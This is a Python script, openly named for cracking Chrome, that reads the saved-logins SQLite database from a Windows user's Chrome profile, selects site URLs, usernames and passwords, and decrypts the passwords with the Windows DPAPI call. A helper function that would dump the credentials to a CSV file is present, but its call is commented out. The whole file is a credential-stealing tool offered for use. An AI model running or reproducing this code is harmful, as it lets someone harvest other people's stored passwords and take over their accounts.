# -*- coding: utf-8 -*-

import sqlite3
import os
import win32crypt
import csv

def cracking_chrome():
    usr_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(usr_path)
    cursor = c.cursor()
    sql = "SELECT origin_url, username_value, password_value FROM logins"
    cursor.execute(sql)
    login_data = cursor.fetchall()
    cred = {}
    stng = ''
    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        #generate_csv(url, user_name, pwd[1].decode('utf8'))
        string = f"\n[*] URL: {url} Username: {user_name} Password: {pwd[1].decode('utf8')}"


def generate_csv(url, username, password):
   """ generate csv """
   with open("data.csv", mode='w') as csv_file:
       fields = ['url',  'email', 'password']
       writer = csv.DictWriter(csv_file, fieldnames=fields)
       writer.writeheader()
       writer.writerow({'url': url, "email": username, "password": password})


if __name__ == "__main__":
    cracking_chrome()
